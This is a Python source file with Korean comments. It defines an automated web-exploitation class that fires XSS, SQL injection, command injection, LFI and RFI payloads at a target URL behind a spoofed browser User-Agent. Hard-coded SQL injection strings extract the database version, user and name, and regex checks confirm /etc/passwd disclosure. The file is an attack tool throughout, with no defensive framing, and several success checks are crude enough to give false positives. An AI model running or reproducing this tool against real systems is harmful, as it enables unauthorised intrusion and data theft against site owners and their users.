import requests
import subprocess
import time
from typing import Dict, Optional
from urllib.parse import urljoin
import re
import json
from colorama import Fore, Style

class AutoExploit:
    """자동 익스플로잇 클래스"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def exploit_xss(self, payload: str, params: Dict) -> Dict:
        """XSS 취약점을 익스플로잇합니다."""
        try:
            # GET 파라미터로 시도
            response = self.session.get(self.target_url, params=params)
            if payload in response.text:
                return {
                    'success': True,
                    'method': 'GET',
                    'params': params,
                    'response': response.text[:200]  # 응답의 처음 200자만 저장
                }
            
            # POST 파라미터로 시도
            response = self.session.post(self.target_url, data=params)
            if payload in response.text:
                return {
                    'success': True,
                    'method': 'POST',
                    'params': params,
                    'response': response.text[:200]
                }
            
            return {'success': False, 'error': 'XSS exploitation failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_sql_injection(self, payload: str, params: Dict) -> Dict:
        """SQL 인젝션 취약점을 익스플로잇합니다."""
        try:
            # 에러 기반 SQL 인젝션 시도
            error_payloads = [
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CONVERT(int,(SELECT user()))--",
                "' AND 1=CONVERT(int,(SELECT database()))--"
            ]
            
            for error_payload in error_payloads:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = error_payload
                
                response = self.session.get(self.target_url, params=test_params)
                if 'SQL' in response.text or 'syntax' in response.text.lower():
                    return {
                        'success': True,
                        'method': 'GET',
                        'params': test_params,
                        'type': 'Error-based',
                        'response': response.text[:200]
                    }
            
            # UNION 기반 SQL 인젝션 시도
            union_payloads = [
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,user(),database()--"
            ]
            
            for union_payload in union_payloads:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = union_payload
                
                response = self.session.get(self.target_url, params=test_params)
                if 'UNION' in response.text or 'SELECT' in response.text:
                    return {
                        'success': True,
                        'method': 'GET',
                        'params': test_params,
                        'type': 'Union-based',
                        'response': response.text[:200]
                    }
            
            return {'success': False, 'error': 'SQL injection exploitation failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_command_injection(self, payload: str, params: Dict) -> Dict:
        """명령어 인젝션 취약점을 익스플로잇합니다."""
        try:
            # 기본 명령어 인젝션 시도
            test_params = params.copy()
            for key in test_params:
                test_params[key] = f"; {payload}"
            
            response = self.session.get(self.target_url, params=test_params)
            if 'root' in response.text or 'bin' in response.text:
                return {
                    'success': True,
                    'method': 'GET',
                    'params': test_params,
                    'response': response.text[:200]
                }
            
            # POST 요청으로 시도
            response = self.session.post(self.target_url, data=test_params)
            if 'root' in response.text or 'bin' in response.text:
                return {
                    'success': True,
                    'method': 'POST',
                    'params': test_params,
                    'response': response.text[:200]
                }
            
            return {'success': False, 'error': 'Command injection exploitation failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_lfi(self, payload: str, params: Dict) -> Dict:
        """로컬 파일 포함 취약점을 익스플로잇합니다."""
        try:
            test_params = params.copy()
            for key in test_params:
                test_params[key] = payload
            
            response = self.session.get(self.target_url, params=test_params)
            
            # 일반적인 파일 내용 패턴 확인
            file_patterns = [
                r'root:.*:0:0:',
                r'daemon:.*:1:1:',
                r'bin:.*:2:2:'
            ]
            
            for pattern in file_patterns:
                if re.search(pattern, response.text):
                    return {
                        'success': True,
                        'method': 'GET',
                        'params': test_params,
                        'file': payload,
                        'response': response.text[:200]
                    }
            
            return {'success': False, 'error': 'LFI exploitation failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_rfi(self, payload: str, params: Dict) -> Dict:
        """원격 파일 포함 취약점을 익스플로잇합니다."""
        try:
            test_params = params.copy()
            for key in test_params:
                test_params[key] = payload
            
            response = self.session.get(self.target_url, params=test_params)
            
            # PHP 코드 실행 확인
            if '<?php' in response.text or 'system(' in response.text:
                return {
                    'success': True,
                    'method': 'GET',
                    'params': test_params,
                    'response': response.text[:200]
                }
            
            return {'success': False, 'error': 'RFI exploitation failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def auto_exploit(self, vuln_type: str, payload: str, params: Dict) -> Dict:
        """취약점 유형에 따라 자동으로 익스플로잇을 시도합니다."""
        exploit_methods = {
            'xss': self.exploit_xss,
            'sql_injection': self.exploit_sql_injection,
            'command_injection': self.exploit_command_injection,
            'lfi': self.exploit_lfi,
            'rfi': self.exploit_rfi
        }
        
        if vuln_type.lower() in exploit_methods:
            print(f"{Fore.CYAN}[*] {vuln_type.upper()} 취약점 익스플로잇 시도 중...{Style.RESET_ALL}")
            result = exploit_methods[vuln_type.lower()](payload, params)
            
            if result['success']:
                print(f"{Fore.GREEN}[+] {vuln_type.upper()} 취약점 익스플로잇 성공!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] 사용된 페이로드: {payload}{Style.RESET_ALL}")
                if 'response' in result:
                    print(f"{Fore.YELLOW}[*] 응답: {result['response']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] {vuln_type.upper()} 취약점 익스플로잇 실패: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
            
            return result
        else:
            return {'success': False, 'error': f'Unsupported vulnerability type: {vuln_type}'} 